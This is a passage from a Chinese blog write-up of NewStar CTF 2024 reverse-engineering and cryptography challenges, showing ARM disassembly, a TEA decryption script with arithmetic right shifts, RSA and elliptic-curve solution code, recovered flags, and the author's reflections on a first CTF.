class="number">00010</span>F14                 <span class="keyword">STR</span>     <span class="built_in">R3</span>, [<span class="built_in">R11</span>,<span class="symbol">#var_14</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>F18                 <span class="keyword">LDR</span>     <span class="built_in">R3</span>, [<span class="built_in">R11</span>,<span class="symbol">#var_14</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>F1C                 <span class="keyword">MOV</span>     <span class="built_in">R2</span>, <span class="built_in">R3</span>,LSL<span class="number">#4</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>F20                 <span class="keyword">LDR</span>     <span class="built_in">R3</span>, [<span class="built_in">R11</span>,<span class="symbol">#var_1C</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>F24                 <span class="keyword">ADD</span>     <span class="built_in">R3</span>, <span class="built_in">R3</span>, <span class="number">#8</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>F28                 <span class="keyword">LDR</span>     <span class="built_in">R3</span>, [<span class="built_in">R3</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>F2C                 <span class="keyword">ADD</span>     <span class="built_in">R2</span>, <span class="built_in">R2</span>, <span class="built_in">R3</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>F30                 <span class="keyword">LDR</span>     <span class="built_in">R1</span>, [<span class="built_in">R11</span>,<span class="symbol">#var_14</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>F34                 <span class="keyword">LDR</span>     <span class="built_in">R3</span>, [<span class="built_in">R11</span>,<span class="symbol">#var_C</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>F38                 <span class="keyword">ADD</span>     <span class="built_in">R3</span>, <span class="built_in">R1</span>, <span class="built_in">R3</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>F3C                 <span class="keyword">EOR</span>     <span class="built_in">R2</span>, <span class="built_in">R2</span>, <span class="built_in">R3</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>F40                 <span class="keyword">LDR</span>     <span class="built_in">R3</span>, [<span class="built_in">R11</span>,<span class="symbol">#var_14</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>F44                 <span class="keyword">MOV</span>     <span class="built_in">R1</span>, <span class="built_in">R3</span>,ASR<span class="number">#5</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>F48                 <span class="keyword">LDR</span>     <span class="built_in">R3</span>, [<span class="built_in">R11</span>,<span class="symbol">#var_1C</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>F4C                 <span class="keyword">ADD</span>     <span class="built_in">R3</span>, <span class="built_in">R3</span>, <span class="number">#0xC</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>F50                 <span class="keyword">LDR</span>     <span class="built_in">R3</span>, [<span class="built_in">R3</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>F54                 <span class="keyword">ADD</span>     <span class="built_in">R3</span>, <span class="built_in">R1</span>, <span class="built_in">R3</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>F58                 <span class="keyword">EOR</span>     <span class="built_in">R3</span>, <span class="built_in">R3</span>, <span class="built_in">R2</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>F5C                 <span class="keyword">LDR</span>     <span class="built_in">R2</span>, [<span class="built_in">R11</span>,<span class="symbol">#var_10</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>F60                 <span class="keyword">ADD</span>     <span class="built_in">R3</span>, <span class="built_in">R2</span>, <span class="built_in">R3</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>F64                 <span class="keyword">STR</span>     <span class="built_in">R3</span>, [<span class="built_in">R11</span>,<span class="symbol">#var_10</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>F68                 <span class="keyword">LDR</span>     <span class="built_in">R3</span>, [<span class="built_in">R11</span>,<span class="symbol">#var_8</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>F6C                 <span class="keyword">ADD</span>     <span class="built_in">R3</span>, <span class="built_in">R3</span>, <span class="number">#1</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>F70                 <span class="keyword">STR</span>     <span class="built_in">R3</span>, [<span class="built_in">R11</span>,<span class="symbol">#var_8</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>F74</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>F74 loc_10F74                               <span class="comment">; CODE XREF: sub_10E78+3C↑j</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>F74                 <span class="keyword">LDR</span>     <span class="built_in">R3</span>, <span class="symbol">=dword_A6264</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>F78                 <span class="keyword">LDR</span>     <span class="built_in">R3</span>, [<span class="built_in">R3</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>F7C                 <span class="keyword">LDR</span>     <span class="built_in">R2</span>, [<span class="built_in">R11</span>,<span class="symbol">#var_8</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>F80                 <span class="keyword">CMP</span>     <span class="built_in">R2</span>, <span class="built_in">R3</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>F84                 <span class="keyword">BLT</span>     loc_10EB8</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>F88                 <span class="keyword">LDR</span>     <span class="built_in">R3</span>, [<span class="built_in">R11</span>,<span class="symbol">#var_18</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>F8C                 <span class="keyword">LDR</span>     <span class="built_in">R2</span>, [<span class="built_in">R11</span>,<span class="symbol">#var_14</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>F90                 <span class="keyword">STR</span>     <span class="built_in">R2</span>, [<span class="built_in">R3</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>F94                 <span class="keyword">LDR</span>     <span class="built_in">R3</span>, [<span class="built_in">R11</span>,<span class="symbol">#var_18</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>F98                 <span class="keyword">ADD</span>     <span class="built_in">R3</span>, <span class="built_in">R3</span>, <span class="number">#4</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>F9C                 <span class="keyword">LDR</span>     <span class="built_in">R2</span>, [<span class="built_in">R11</span>,<span class="symbol">#var_10</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>FA0                 <span class="keyword">STR</span>     <span class="built_in">R2</span>, [<span class="built_in">R3</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>FA4                 <span class="keyword">NOP</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>FA8                 <span class="keyword">MOV</span>     <span class="built_in">SP</span>, <span class="built_in">R11</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>FAC                 <span class="keyword">POP</span>     &#123;<span class="built_in">R11</span>&#125;</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>FB0                 <span class="keyword">BX</span>      <span class="built_in">LR</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>FB0 <span class="comment">; End of function sub_10E78</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>FB0</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>FB0 <span class="comment">; ---------------------------------------------------------------------------</span></span><br></pre></td></tr></table></figure>
<p>观察发现以下行对应前半部分（v2）的加密的以下步骤，且密钥的数值从未发生变化（也就是说不需要考虑密钥变动的因素）：</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>ED0                 <span class="keyword">MOV</span>     <span class="built_in">R2</span>, <span class="built_in">R3</span>,LSL<span class="number">#4</span>       <span class="comment">; v3 &lt;&lt; 4</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>ED4                 <span class="keyword">LDR</span>     <span class="built_in">R3</span>, [<span class="built_in">R11</span>,<span class="symbol">#var_1C</span>]  <span class="comment">; 加载密钥</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>ED8                 <span class="keyword">LDR</span>     <span class="built_in">R3</span>, [<span class="built_in">R3</span>]           <span class="comment">; 加载密钥的第一个32位</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>EDC                 <span class="keyword">ADD</span>     <span class="built_in">R2</span>, <span class="built_in">R2</span>, <span class="built_in">R3</span>         <span class="comment">; (v3 &lt;&lt; 4) + k0					//①实测r2为238320D0，r3为11223344，加和为34a55414</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>EE0                 <span class="keyword">LDR</span>     <span class="built_in">R1</span>, [<span class="built_in">R11</span>,<span class="symbol">#var_10</span>]  <span class="comment">; 加载明文的第二个32位</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>EE4                 <span class="keyword">LDR</span>     <span class="built_in">R3</span>, [<span class="built_in">R11</span>,<span class="symbol">#var_C</span>]   <span class="comment">; 加载sum</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>EE8                 <span class="keyword">ADD</span>     <span class="built_in">R3</span>, <span class="built_in">R1</span>, <span class="built_in">R3</span>         <span class="comment">; v3 + sum						//②实测r1为b238320d，r3为daa66d2b，加和为8cde9f38</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>EEC                 <span class="keyword">EOR</span>     <span class="built_in">R2</span>, <span class="built_in">R2</span>, <span class="built_in">R3</span>         <span class="comment">; (v3 &lt;&lt; 4) + k0 ^ (v3 + sum)				//③实测异或结果为b87bcb2c</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>EF0                 <span class="keyword">LDR</span>     <span class="built_in">R3</span>, [<span class="built_in">R11</span>,<span class="symbol">#var_10</span>]  <span class="comment">; 加载明文的第二个32位</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>EF4                 <span class="keyword">MOV</span>     <span class="built_in">R1</span>, <span class="built_in">R3</span>,ASR<span class="number">#5</span>       <span class="comment">; v3 &gt;&gt; 5</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>EF8                 <span class="keyword">LDR</span>     <span class="built_in">R3</span>, [<span class="built_in">R11</span>,<span class="symbol">#var_1C</span>]  <span class="comment">; 加载密钥</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>EFC                 <span class="keyword">ADD</span>     <span class="built_in">R3</span>, <span class="built_in">R3</span>, <span class="number">#4</span>         <span class="comment">; 指向密钥的指针加上4位</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>F00                 <span class="keyword">LDR</span>     <span class="built_in">R3</span>, [<span class="built_in">R3</span>]           <span class="comment">; 加载密钥的第二个32位</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>F04                 <span class="keyword">ADD</span>     <span class="built_in">R3</span>, <span class="built_in">R1</span>, <span class="built_in">R3</span>         <span class="comment">; (v3 &gt;&gt; 5) + k1					//④实测r1为FD91C190，r3为55667788，加和为52f83918</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>F08                 <span class="keyword">EOR</span>     <span class="built_in">R3</span>, <span class="built_in">R3</span>, <span class="built_in">R2</span>         <span class="comment">; (v3 &lt;&lt; 4) + k0 ^ (v3 + sum) ^ (v3 &gt;&gt; 5) + k1</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>F0C                 <span class="keyword">LDR</span>     <span class="built_in">R2</span>, [<span class="built_in">R11</span>,<span class="symbol">#var_14</span>]  <span class="comment">; 加载明文的第一个32位</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>F10                 <span class="keyword">ADD</span>     <span class="built_in">R3</span>, <span class="built_in">R2</span>, <span class="built_in">R3</span>         <span class="comment">; v2 += (v3 &lt;&lt; 4) + k0 ^ (v3 + sum) ^ (v3 &gt;&gt; 5) + k1	//既然这一步的右边出现偏差，手动计算它的组成部分的应有数值</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>F14                 <span class="keyword">STR</span>     <span class="built_in">R3</span>, [<span class="built_in">R11</span>,<span class="symbol">#var_14</span>]  <span class="comment">; 存储新的v2</span></span><br></pre></td></tr></table></figure>
<p>第二轮产生的v2和v3为：<code>0x011e2192</code>, <code>0xb238320d</code>，第三轮代入的sum为：<code>0xdaa66d2b</code>，那么在第三轮计算过程中：</p>
<p>①处的值应当为<code>0x34a55414</code> (<code>0xb34a55414 &amp; 0xFFFFFFFF</code>)，符合结果，②处的值应当为<code>0x8cde9f38</code> (<code>0x18cde9f38 &amp; 0xFFFFFFFF</code>)，<font color=LimeGreen><strong>符合结果，</strong></font></p>
<p>③处的值应当为<code>0xb87bcb2c</code> (<code>0xab87bcb2c &amp; 0xFFFFFFFF</code>)，符合结果，④处的值应当为<code>0x5af83918</code>，带入检验，<font color=red><strong>不符合结果！</strong></font></p>
<p>观察④处，v3的值为<code>0xb238320d</code>，r1应当是<code>0x0591c190</code>，这与实测结果<font color=red><strong>不符</strong></font>，仔细观察操作符之后发现是<font color=red><strong>算术右移</strong></font>（补全高位均为1）而非<font color=red><strong>逻辑右移</strong></font>（高位保持均为0），算术右移结果为<code>0xfd91c190</code>，<font color=LimeGreen><strong>符合</strong></font>结果，修改python的tea加密脚本，代入<code>0x34333231</code>和<code>0x38373635</code>进行检验，发现也不对，综合分析得到结果：若最高位为1（大于等于0x80000000），补全前面的位数（算术右移），否则保持前五位为0（逻辑右移），代入检验发现符合调试结果：<br><img src="/pictures/ns24_myarm.png" title="tea"><br><br>编写正向加密脚本：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">m1 = ?</span><br><span class="line">m2 = ?</span><br><span class="line">key = [?, ?, ?, ?]</span><br><span class="line">total = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">  total = (total + <span class="number">0x9E3779B9</span>) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">  <span class="keyword">if</span> m2 &amp; <span class="number">0x80000000</span>: </span><br><span class="line">    ASR5_m2 = (m2 &gt;&gt; <span class="number">5</span>) | (<span class="number">0xFFFFFFFF</span> &lt;&lt; (<span class="number">32</span> - <span class="number">5</span>))</span><br><span class="line">  <span class="keyword">else</span>: </span><br><span class="line">    ASR5_m2 = (m2 &gt;&gt; <span class="number">5</span>)</span><br><span class="line">  m1 = (m1 + ((ASR5_m2 + key[<span class="number">1</span>]) ^ (<span class="number">16</span> * m2 + key[<span class="number">0</span>]) ^ (m2 + total))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">  <span class="keyword">if</span> m1 &amp; <span class="number">0x80000000</span>: </span><br><span class="line">    ASR5_m1 = (m1 &gt;&gt; <span class="number">5</span>) | (<span class="number">0xFFFFFFFF</span> &lt;&lt; (<span class="number">32</span> - <span class="number">5</span>))</span><br><span class="line">  <span class="keyword">else</span>: </span><br><span class="line">    ASR5_m1 = (m1 &gt;&gt; <span class="number">5</span>)</span><br><span class="line">  m2 = (m2 + ((ASR5_m1 + key[<span class="number">3</span>]) ^ (<span class="number">16</span> * m1 + key[<span class="number">2</span>]) ^ (m1 + total))) &amp; <span class="number">0xFFFFFFFF</span></span><br></pre></td></tr></table></figure>
<p>经过动态调试发现key为定值，永远位第五组的<font color=lime><strong>[0x11223344, 0x55667788, 0x9900AABB, 0xCCDDEEFF]</strong></font>，那么相应地，密文也应当是第五组的密文<font color=lime><strong>[0xA0F8CB44, 0xF82F83CF, 0xA55E48C2, 0x7A26E00A, 0xF1E354C9, 0x687D9915, 0xF88816E8, 0x90878E86, 0x3AB06298, 0xCBCFE78B, 0x578F0F50, 0xC39E3C65, 0xBBE92B84, 0x128A2CA2, 0xDB8F03F5, 0x8482F8E2]</strong></font>，编写逆向脚本：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">asr</span>(<span class="params">value, shift</span>):</span><br><span class="line">  value = value &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">  <span class="keyword">if</span> value &amp; <span class="number">0x80000000</span>:</span><br><span class="line">    result = (value &gt;&gt; shift) | (<span class="number">0xFFFFFFFF</span> &lt;&lt; (<span class="number">32</span> - shift))</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    result = value &gt;&gt; shift</span><br><span class="line">  <span class="keyword">return</span> result &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tea_decrypt</span>(<span class="params">m1, m2, key</span>):</span><br><span class="line">  delta = <span class="number">0x9E3779B9</span></span><br><span class="line">  total = (delta * <span class="number">32</span>) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    m2 = (m2 - ((asr(m1, <span class="number">5</span>) + key[<span class="number">3</span>]) ^ (<span class="number">16</span> * m1 + key[<span class="number">2</span>]) ^ (m1 + total))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    m1 = (m1 - ((asr(m2, <span class="number">5</span>) + key[<span class="number">1</span>]) ^ (<span class="number">16</span> * m2 + key[<span class="number">0</span>]) ^ (m2 + total))) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">  total = (total - delta) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">  <span class="keyword">return</span> m1, m2</span><br><span class="line"></span><br><span class="line">flag = [ <span class="number">0xA0F8CB44</span>, <span class="number">0xF82F83CF</span>, <span class="number">0xA55E48C2</span>, <span class="number">0x7A26E00A</span>, <span class="number">0xF1E354C9</span>, <span class="number">0x687D9915</span>, <span class="number">0xF88816E8</span>, <span class="number">0x90878E86</span>,</span><br><span class="line">         <span class="number">0x3AB06298</span>, <span class="number">0xCBCFE78B</span>, <span class="number">0x578F0F50</span>, <span class="number">0xC39E3C65</span>, <span class="number">0xBBE92B84</span>, <span class="number">0x128A2CA2</span>, <span class="number">0xDB8F03F5</span>, <span class="number">0x8482F8E2</span>]</span><br><span class="line">key = [<span class="number">0x11223344</span>, <span class="number">0x55667788</span>, <span class="number">0x9900AABB</span>, <span class="number">0xCCDDEEFF</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">16</span>, <span class="number">2</span>):</span><br><span class="line">  m1 = flag[i]</span><br><span class="line">  m2 = flag[i + <span class="number">1</span>]</span><br><span class="line">  decrypted_m1, decrypted_m2 = tea_decrypt(m1, m2, key)</span><br><span class="line">  decrypted_m1_le = struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>, decrypted_m1)</span><br><span class="line">  decrypted_m2_le = struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>, decrypted_m2)</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;decrypted_m1_le.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;decrypted_m2_le.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>输出为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">666c61677b41524d5f5f4072636831743363747552655f2d6e336564735f2d74305f5f62655f2d64654275676765645f5f7573316e672d5f51454d555f5f217d</span><br></pre></td></tr></table></figure>
<p>十六进制转文本得<font color=deepskyblue><strong>flag{ARM__@rch1t3ctuRe_-n3eds_-t0__be_-deBugged__us1ng-_QEMU__!}</strong></font>.</p>
<h3 id="Lock："><a href="#Lock：" class="headerlink" title="Lock："></a>Lock：</h3><p>发现是python文件，还给了一个pyd动态链接库，发现pyd文件很难动态调试，直接运行程序，发现会返回输入字符串中有几个字符在正确的位置，于是进行逐位测试，最终得到<font color=deepskyblue><strong>flag{d6cf50e2736849b4ba21}</strong></font>.</p>
<h2 id="Crypto方向：-4"><a href="#Crypto方向：-4" class="headerlink" title="Crypto方向："></a>Crypto方向：</h2><h3 id="RSA？cmd5！："><a href="#RSA？cmd5！：" class="headerlink" title="RSA？cmd5！："></a>RSA？cmd5！：</h3><p>由于m比较短，先试着求m的md5：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line">n = <span class="number">139458221347981983099030378716991183653410063401398496859351212711302933950230621243347114295539950275542983665063430931475751013491128583801570410029527087462464558398730501041018349125941967135719526654701663270142483830687281477000567117071676521061576952568958398421029292366101543468414270793284704549051</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">s = <span class="number">5461514893126669960233658468203682813465911805334274462134892270260355037191167357098405392972668890146716863374229152116784218921275571185229135409696720018765930919309887205786492284716906060670649040459662723215737124829497658722113929054827469554157634284671989682162929417551313954916635460603628116503</span></span><br><span class="line">hm1 = <span class="built_in">pow</span>(s, e, n)</span><br><span class="line">md5_hash = long_to_bytes(hm1).decode()</span><br><span class="line"><span class="built_in">print</span>(md5_hash)</span><br></pre></td></tr></table></figure>
<p>求得md5为<font color=lime><strong>86133884de98baada58a8c4de66e15b8</strong></font>，在线解密得到m为<font color=lime><strong>adm0n12</strong></font>，得到flag: <font color=deepskyblue><strong>flag{th1s_1s_my_k3y:adm0n120xbfab06114aa460b85135659e359fe443f9d91950ca95cbb2cbd6f88453e2b08b}</strong></font>.</p>
<h3 id="easy-ecc："><a href="#easy-ecc：" class="headerlink" title="easy_ecc："></a>easy_ecc：</h3><p>发现是椭圆曲线加密，由于知道私钥k，所以可以直接求<code>m = c1 + (-k) \* c2</code>，得到m的坐标为<code>(42473705116462428406202294102847935773542820132768934248776117467532517063207, 28673652398806211089618369285265886256488311031977716002800065471137170688215)</code>，但是发现xm和ym均远大于所给的c_left和c_right，考虑模逆元，得到<code>flag_left = 531812496965563174412251588431148136</code> 和 <code>flag_right = 526357398425538015765092604513836925</code>，<code>long_to_bytes</code> 转换得到<font color=deepskyblue><strong>flag{This_is_the_last_crypto_}</strong></font>.<br><br><br>Sagemath代码：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, inverse</span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> GF, EllipticCurve</span><br><span class="line"></span><br><span class="line">p = <span class="number">64408890408990977312449920805352688472706861581336743385477748208693864804529</span></span><br><span class="line">a = <span class="number">111430905433526442875199303277188510507615671079377406541731212384727808735043</span></span><br><span class="line">b = <span class="number">89198454229925288228295769729512965517404638795380570071386449796440992672131</span></span><br><span class="line">E = EllipticCurve(GF(p), [a, b])</span><br><span class="line">c1 = E(<span class="number">10968743933204598092696133780775439201414778610710138014434989682840359444219</span>, <span class="number">50103014985350991132553587845849427708725164924911977563743169106436852927878</span>)</span><br><span class="line">c2 = E(<span class="number">16867464324078683910705186791465451317548022113044260821414766837123655851895</span>, <span class="number">35017929439600128416871870160299373917483006878637442291141472473285240957511</span>)</span><br><span class="line">c_left = <span class="number">15994601655318787407246474983001154806876869424718464381078733967623659362582</span></span><br><span class="line">c_right = <span class="number">3289163848384516328785319206783144958342012136997423465408554351179699716569</span></span><br><span class="line">k = <span class="number">86388708736702446338970388622357740462258632504448854088010402300997950626097</span></span><br><span class="line"></span><br><span class="line">m = c1 + (-k) * c2</span><br><span class="line">m_x = <span class="built_in">int</span>(m[<span class="number">0</span>])</span><br><span class="line">m_y = <span class="built_in">int</span>(m[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;m_x: <span class="subst">&#123;m_x&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;m_y: <span class="subst">&#123;m_y&#125;</span>&quot;</span>)</span><br><span class="line">m_x_inv = inverse(m_x, p)</span><br><span class="line">m_y_inv = inverse(m_y, p)</span><br><span class="line">flag_part1 = (c_left * m_x_inv) % p</span><br><span class="line">flag_part2 = (c_right * m_y_inv) % p</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;flag_part1: <span class="subst">&#123;flag_part1&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;flag_part2: <span class="subst">&#123;flag_part2&#125;</span>&quot;</span>)</span><br><span class="line">flag_part1_bytes = long_to_bytes(flag_part1)</span><br><span class="line">flag_part2_bytes = long_to_bytes(flag_part2)</span><br><span class="line">flag = flag_part1_bytes + flag_part2_bytes</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Recovered flag: <span class="subst">&#123;flag.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="没e也能玩："><a href="#没e也能玩：" class="headerlink" title="没e也能玩："></a>没e也能玩：</h3><p>真的没给e吗？e其实还是65537，直接带进去之前的脚本就好了，得出<font color=deepskyblue><strong>flag{No_course_e_can_play}</strong></font>.</p>
<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>这是我第一次参加CTF，开始时我确实是什么都不懂，完全零基础参赛的，在比赛过程中学习积累了很多知识和技巧，也交到了很多朋友，顺道奠定了我之后选择逆向方向的基础<del>（毕竟打得最好的就这个方向）</del>，了解CTF前，我对网络安全方向的认知一直都是靠偶尔在B站刷出来的所谓“黑客教程”视频，这次比赛是我对网安这个领域的初探，也很奇幻般地立刻成为了我的兴趣爱好之一。</p>
<p>NewStar CTF作为一个“招新赛”，无疑是属于设计的非常完美的那一档：前几周的题目从最基本的知识和方法考起，零基础也能通过现学而掌握这些知识而不会因为门槛太高而直接放弃，难度循序渐进（对于我来说就是确保了恰好每周做一道题的时间都差不多，没有因出现重复的前几周学过的内容而变得简单，也很少有因出现跨越性的知识而导致新手完全看不懂或者不想看导致半途而废，<del>甚至直到现在我评价题目的难度都是用“week x”来评价，已经潜移默化地成为了我的难度评判标准</del>），题目也都很有意思，解题时的趣味和解出flag的瞬间带来的成就感双重推进，使得整个参赛过程都是充满做题动力的。</p>
<p>总的来说，我很庆幸当时尝试参加了这次比赛，如果没有参与的话，或许我在大学的四年生活不会缺乏色彩，但也不会像如今这样丰富充实，比赛过程中认识的朋友们也都成为了我生活中不可或缺的一部分，为我的生活带来能够共享欢声笑语、随心所欲畅谈以及互相学习进步的对象（<del>毕竟不管是网安还是我的其他兴趣爱好比如天文，质数之类的都比较小众，我小学初中高中十二年也没找到有跟我的兴趣爱好有共同语言的人</del>），感谢这次比赛提供的机会，也让我对人生的选择多了一种全新的可能。</p>

        
      </div>

         
    </div>
    
     
  </div>
  
    
<nav id="article-nav">
  <a class="article-nav-btn left "
    
      href="/2024/11/25/qwqsn_24/"
